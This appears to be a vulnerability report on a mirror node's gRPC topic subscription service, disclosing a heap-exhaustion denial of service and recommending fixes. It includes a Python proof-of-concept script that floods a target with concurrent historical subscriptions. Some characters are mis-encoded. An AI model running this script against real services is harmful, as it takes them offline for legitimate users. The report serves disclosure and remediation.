### Title
Unbounded Concurrent Subscriptions with Historical `startTime=0` Cause Heap Exhaustion via Thundering-Herd DB Queries in `PollingTopicListener`

### Summary
`PollingTopicListener.listen()` creates a per-subscription polling loop that, on each tick, calls `TopicMessageRepositoryCustomImpl.findByFilter()` which materializes up to `maxPageSize=5000` `TopicMessage` objects into heap via `getResultList()`. There is no global limit on concurrent subscriptions and no lower bound on `startTime` beyond `@Min(0)`, so an unprivileged attacker can open arbitrarily many connections each with `startTime=0`, causing simultaneous large DB result sets to be fully loaded into JVM heap, exhausting memory and crashing the gRPC service.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` ( [1](#0-0) ) creates a `Flux` that calls `poll()` after an initial `delaySubscription(interval)` (default 500 ms) and then repeats every 500 ms indefinitely.

`poll()` ( [2](#0-1) ) computes `pageSize = Math.min(Integer.MAX_VALUE, listenerProperties.getMaxPageSize())` â€” defaulting to **5000** â€” and passes it as the `limit` to `findByFilter()`.

`TopicMessageRepositoryCustomImpl.findByFilter()` ( [3](#0-2) ) builds a JPA `TypedQuery`, calls `typedQuery.getResultList()` (line 60), and wraps it in `.stream()`. `getResultList()` **fully materializes** the entire result set as a `List<TopicMessage>` in heap before any element is consumed.

**Root cause â€” failed assumption:** The code assumes subscriptions will only be opened near the current time, so the first poll will return few or zero messages. This assumption is broken because:

1. `TopicMessageFilter.startTime` only requires `@Min(0)` and `isValidStartTime()` checks `startTime <= DomainUtils.now()` ( [4](#0-3) ). `startTime=0` (Unix epoch in nanoseconds) passes both checks.
2. `maxConcurrentCallsPerConnection=5` ( [5](#0-4) ) is a **per-connection** limit; there is no global cap on connections or total active subscriptions.
3. No rate limiting exists on the gRPC subscription endpoint (throttling is only in the `web3` module).

**Exploit flow:**

1. Attacker opens `N` gRPC connections to port 5600 (no auth required).
2. On each connection, attacker opens 5 `subscribeTopic` streams with `startTime=0` and a valid `topicId`.
3. After 500 ms, all `NĂ—5` polling loops fire simultaneously (jitter is only Â±10%, so overlap is near-total).
4. Each fires `findByFilter()` â†’ `getResultList()` â†’ up to 5000 `TopicMessage` objects materialized in heap per subscription.
5. `NĂ—5Ă—5000` objects are live in heap simultaneously.

### Impact Explanation

Each `TopicMessage` carries payload bytes, timestamps, and metadata. At 5000 objects per subscription, 200 concurrent subscriptions (40 connections) produce 1,000,000 live `TopicMessage` objects simultaneously. This exhausts JVM heap, triggering `OutOfMemoryError` and crashing the gRPC service. The mirror node's HCS subscription API becomes unavailable to all legitimate users. Because the default listener type is `REDIS` and `POLL` must be explicitly configured, this affects deployments that set `hiero.mirror.grpc.listener.type=POLL`. [6](#0-5) 

### Likelihood Explanation

No credentials are required. Any client with network access to port 5600 can open gRPC streams. The attack requires only a standard gRPC client library (e.g., `grpc-java`, `grpcurl`) and a loop to open connections. It is trivially repeatable and can be automated in under 20 lines of code. The only partial mitigation (`maxConcurrentCallsPerConnection=5`) is easily bypassed by opening more connections. [7](#0-6) 

### Recommendation

1. **Enforce a minimum `startTime` offset**: Reject subscriptions where `startTime` is older than a configurable threshold (e.g., 1 hour before `now()`), or add a `@Min` constraint relative to current time.
2. **Add a global concurrent-subscription limit**: Track `subscriberCount` (already present in `TopicMessageServiceImpl`) and reject new subscriptions above a configurable cap. [8](#0-7) 
3. **Replace `getResultList()` with a true streaming cursor**: Use `getResultStream()` with a Hibernate scroll or Spring Data `@QueryHints(FETCH_SIZE)` so rows are not all materialized at once. [9](#0-8) 
4. **Add per-IP or global connection rate limiting** at the Netty/gRPC layer.

### Proof of Concept

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2, timestamp_pb2

TARGET = "mirror-node:5600"
TOPIC_ID = 1234          # any valid topic with historical messages
NUM_CONNECTIONS = 50
STREAMS_PER_CONN = 5     # matches maxConcurrentCallsPerConnection

def open_streams(conn_idx):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    streams = []
    for _ in range(STREAMS_PER_CONN):
        req = consensus_service_pb2.ConsensusTopicQuery(
            topicID=...,
            consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),  # epoch = startTime=0
        )
        # open stream but don't consume â€” keeps subscription alive
        streams.append(stub.subscribeTopic(req))
    # hold streams open
    import time; time.sleep(300)

threads = [threading.Thread(target=open_streams, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
# After ~500ms, 250 concurrent DB queries each returning 5000 TopicMessages fire
# Monitor gRPC pod for OOM / heap exhaustion
for t in threads: t.join()
```

After ~500 ms, `NUM_CONNECTIONS Ă— STREAMS_PER_CONN = 250` simultaneous `getResultList()` calls each returning up to 5000 `TopicMessage` objects will be live in heap, exhausting JVM memory.

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }

    public Stream<TopicMessage> findByFilter(TopicMessageFilter filter) {
        CriteriaBuilder cb = entityManager.getCriteriaBuilder();
        CriteriaQuery<TopicMessage> query = cb.createQuery(TopicMessage.class);
        Root<TopicMessage> root = query.from(TopicMessage.class);

        Predicate predicate = cb.and(
                cb.equal(root.get(TOPIC_ID), filter.getTopicId()),
                cb.greaterThanOrEqualTo(root.get(CONSENSUS_TIMESTAMP), filter.getStartTime()));

        if (filter.getEndTime() != null) {
            predicate = cb.and(predicate, cb.lessThan(root.get(CONSENSUS_TIMESTAMP), filter.getEndTime()));
        }

        query = query.select(root).where(predicate).orderBy(cb.asc(root.get(CONSENSUS_TIMESTAMP)));

        TypedQuery<TopicMessage> typedQuery = entityManager.createQuery(query);
        typedQuery.setHint(HibernateHints.HINT_READ_ONLY, true);

        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }

        if (filter.getLimit() != 1) {
            // only apply the hint when limit is not 1
            entityManager.createNativeQuery(TOPIC_MESSAGES_BY_ID_QUERY_HINT).executeUpdate();
        }

        return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
    }
